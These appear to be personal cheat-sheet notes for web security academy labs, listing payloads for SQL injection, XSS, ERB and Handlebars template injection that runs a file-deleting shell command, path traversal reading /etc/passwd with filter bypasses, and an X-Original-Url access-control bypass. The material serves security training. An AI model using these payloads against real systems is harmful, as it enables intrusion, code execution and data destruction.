## SQLi Vulnerabilities:
https://LAB_ID.web-security-academy.net/filter?category=Lifestyle - appending \' causes Internal server error, indicates possible SQLi attack available. Make sure to finish the line with a comment like \# or \-- etc. 

## XSS Vulnerabilities:
In the URL: 
```
/product?productId=1&storeId=</option><script>alert();</script>
/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
/?%27accesskey=%27x%27onclick=%27alert()

```  

## SSTI Vulnerabilities:
- ==Basic server-side template injection== 
  Review ERB Template documentation and test to see if the value is computed
`  https://lab_id.web-security-academy.net/?message=<%= 7*7 %>`
  
  Use system(string) to execute
  
`  https://lab_id.web-security-academy.net/?message=%3C%=%20system(%22rm%20/home/carlos/morale.txt%22)%20%%3E`
- ==Server-side template injection in an unknown language with a documented exploit==
  Handlebars server-side template injection
  1. Modify this exploit so that it calls `require("child_process").exec("rm /home/carlos/morale.txt")` as follows:
    
    `wrtz{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}`
   
   1. URL encode your exploit and add it as the value of the message parameter in the URL. The final exploit should look like this, but remember to replace `YOUR-LAB-ID` with your own lab ID:
    
    `https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d`

## File Path Traversal Vulnerabilities:
- ==File path traversal, traversal sequences blocked with absolute path bypass== 
  https://lab_id.web-security-academy.net/image?filename=/etc/passwd
- ==File path traversal, traversal sequences stripped non-recursively==
  https://lab_id.web-security-academy.net/image?filename=....//....//....//etc/passwd
- ==File path traversal, traversal sequences stripped with superfluous URL-decode==
  https://lab_id.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd
- ==File path traversal, validation of start of path== 
  https://lab_id.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
- ==File path traversal, validation of file extension with null byte bypass== 
  An application may require the user-supplied filename to end with an expected file extension, such as .png. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. 
  
  https://lab_id.web-security-academy.net/image?filename=../../../etc/passwd%00.png

## Access Control Vulnerabilities
- ==URL-based access control can be circumvented== 
  Change to POST and add X-Original-Url header and add request parameter for username
  
  POST / HTTP/2
  Host: 0a7800de03c0132581cd3961005f00af.web-security-academy.net
  X-Original-Url: /admin/delete
  
  username=carlos
